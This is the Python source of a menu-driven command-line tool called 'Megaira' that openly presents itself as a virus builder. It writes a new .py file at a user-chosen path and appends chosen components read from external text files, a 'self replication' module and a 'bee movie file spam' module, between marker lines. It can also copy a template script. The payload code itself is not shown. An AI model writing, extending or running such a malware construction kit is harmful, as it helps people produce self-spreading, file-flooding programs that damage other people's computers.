from colorama import Fore
import time
from tqdm import tqdm
import os

def main():

  print(Fore.YELLOW + "welcome, loading....\n")
  for i in tqdm(range(100)):
    time.sleep(0.03)

  print(Fore.LIGHTRED_EX + """
    __  __                  _           
  |  \/  |                (_)          
  | \  / | ___  __ _  __ _ _ _ __ __ _ 
  | |\/| |/ _ \/ _` |/ _` | | '__/ _` |
  | |  | |  __/ (_| | (_| | | | | (_| |
  |_|  |_|\___|\__, |\__,_|_|_|  \__,_|
                __/ |                  
                |___/                   
                
  """)
  print(Fore.RESET)
  
  def main_menu():
    print(Fore.MAGENTA + "WELCOME TO MEGAIRA")
    print(Fore.RESET)
    menu = int(input("""------------
please select an option:

1) build a virus
2) download templates
3) quit
----------
"""))

    try:
      if menu == 1:
        print("----------")
        path = str(input("enter the path of where you would like the file to go:\n"))
        file_name = str(input("please enter what you want the file to be called: "))
        megaira_path = os.path.dirname(os.path.realpath(__file__))
        os.chdir(path)
        main_file = open(f"{file_name}.py", "a")
        main_file.write("### START OF VIRO: Mwu$WaL&Ck#K_8h=P_5^hwW!FH&M ###")
        os.chdir(megaira_path)
        print("----------")
        
        def component_choice():
          which_component = int(input("""please enter the number of which component you would like to add:
          
1) self replication
2) bee movie file spam
3) null
4) null
5) null

0) exit
-----------
"""))

          try:
            
            if which_component == 1:
              with open("components/self_replication.txt", "r") as f:
                self_replicate = f.read()
              os.chdir(path)
              main_file.write("\n")
              main_file.write(self_replicate)
              os.chdir(megaira_path)
              print("done!\n")
              component_choice()
            
            
            elif which_component == 2:
              with open("components/bee_mov_spm.txt", 'r') as f:
                bee_spam = f.read()
              os.chdir(path)
              main_file.write("\n")
              main_file.write(bee_spam)
              os.chdir(megaira_path)
              print("done!\n")
              component_choice()
            
            
            elif which_component == 3:
              print("this feature has yet to be implemented!")
              component_choice()
            
            
            elif which_component == 4:
              print("this feature has yet to be implemented!")
              component_choice()
            
            
            elif which_component == 5:
              print("this feature has yet to be implemented!")
              component_choice()
            
            
            elif which_component == 0:
              os.chdir(path)
              main_file.write("\n")
              main_file.write("### END OF VIRO: Mwu$WaL&Ck#K_8h=P_5^hwW!FH&M ###")
              main_file.close()
              os.chdir(megaira_path)
              main_menu()
              
            else:
              print("please enter a valid option!")
              component_choice()
          
          
          except ValueError:
            print("please enter a valid option!")
            component_choice()
        component_choice()
      
      
      elif menu == 2:
        template_menu = int(input("""----------
please select an option:
1) franchesca_semantha
2) quit
----------
"""))
        try:
          if template_menu == 1:
            path = str(input("enter the path of where you would like the file to go:\n"))
            file_name = str(input("please enter what you want the file to be called: "))
            print("file is being moved, please stand by...")
            megaira_path = os.path.dirname(os.path.realpath(__file__))
            with open("templates/franchesca_semantha.py", 'r') as f:
              template = f.read()
            os.chdir(path)
            with open(f"{file_name}.py", 'w') as f:
              f.write(template)
            os.chdir(megaira_path)
            print("-----------------")
            print("complete!")
            print("-----------------")
            print("\n")
            main_menu()
          
          
          elif template_menu == 2:
            main_menu()
          else:
            print("enter a valid option!")  
        
        except ValueError:
          print("enter a valid option!")
          main_menu()
        
      elif menu == 3:
        print("goodbye!")
        exit()
      else:
        print("enter a valid option!")

    except ValueError:
      print("enter a valid option!")
      main_menu()
  
  main_menu()


if __name__ == '__main__':
  main()



#todo: add more templates
#todo: components for building

